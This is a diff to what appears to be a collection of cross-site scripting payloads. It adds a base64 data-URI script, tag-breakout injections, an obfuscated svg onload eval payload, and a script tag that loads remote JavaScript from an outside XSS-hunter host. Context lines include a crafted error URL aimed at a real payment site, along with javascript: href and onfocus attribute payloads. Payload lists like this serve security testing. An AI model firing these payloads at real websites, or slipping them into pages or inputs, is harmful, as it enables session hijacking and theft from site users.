@@ -2,6 +2,18 @@
 
 
 
+
+
+//
+data%3atext%2fhtml%3bbase64%2cPHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4
+//
+"></script></title><script>alert(document.domain)</script>
+//
+<svg/onload=throw/**/Uncaught=window.onerror=eval,&quot;;alert\501\51&quot;>
+//
+"><script>$.getScript("//artorias.xss.ht")</script>
+//
+<a href="javascript\x3aalert(1);"></a>
 //
 https://pay.gold.razer.com/Error/Uyt2ZXF0UjZLM0dvMHA4eUFHMDVoZEtrdWxjdzNTeTlYMnpLR0NiOVRmND0?err=%3Csvg%20onpointerenter=z=alert,z(document.domain)%3E
 //
@@ -19,7 +31,7 @@ https://xss-game.appspot.com/level4/frame');javascript:alert('DDD
 // scheame href="javascript:alert(document.domain)"
 javascript:alert(document.domain)
 href="javascript:alert(document.domain)"
-<a href="javascript:alert(document.domain)">javascript:alert(document.domain)</a> 
+{/* <a href="javascript:alert(document.domain)">javascript:alert(document.domain)</a>  */}
 //
 // value=""
 " onfocus=alert(document.domain) 
